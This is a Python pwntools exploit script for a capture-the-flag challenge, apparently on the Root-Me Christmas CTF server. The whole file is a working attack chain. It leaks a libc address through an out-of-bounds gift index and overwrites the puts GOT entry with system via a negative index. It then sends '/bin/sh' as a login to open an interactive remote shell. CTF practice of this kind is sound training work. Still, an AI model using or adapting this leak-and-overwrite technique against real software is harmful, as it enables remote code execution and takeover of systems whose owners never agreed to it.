#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-l", "110"]
context.delete_corefiles = True
context.rename_corefiles = False
host = 'challenges.xmas.root-me.org'
port = 10020

gdbscript = '''
init-pwndbg
break auth
break show_gift
continue
'''.format(**locals())

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


def main():
    io = start()

    # libc leak (index 8)
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendlineafter(b'Login : ', b'\x00'*3 + p32(8)*8)
    io.sendlineafter(b'Password : ', b'\x00'*3 + p32(8)*8)
    io.sendlineafter(b'choose : ', b'z')

    io.recvuntil(b'8th gift : ')
    leak_libc = u64(io.recv(6) + b'\x00\x00')
    success("Leaked stdout: %s" % hex(leak_libc))
    libc.address = leak_libc - libc.sym["_IO_2_1_stdout_"]
    success("Libc base: %s" % hex(libc.address))

    sleep(6)

    # overwrite GOT entry of puts (index -6)
    io.sendlineafter(b'Your choice : ', b'2')
    io.sendlineafter(b'Login : ', b'toto')
    io.sendlineafter(b'Password : ', b'toto')
    io.sendlineafter(b'modify ? ', b'-6')
    io.sendlineafter(b'Go for it !', b'A'*8 + p64(libc.sym["system"]))

    sleep(3)

    # get a shell
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendlineafter(b'Login : ', b'/bin/sh')
    io.sendlineafter(b'Password : ', b'pouet')
    
    io.interactive()    
    
if __name__ == "__main__":
    main()
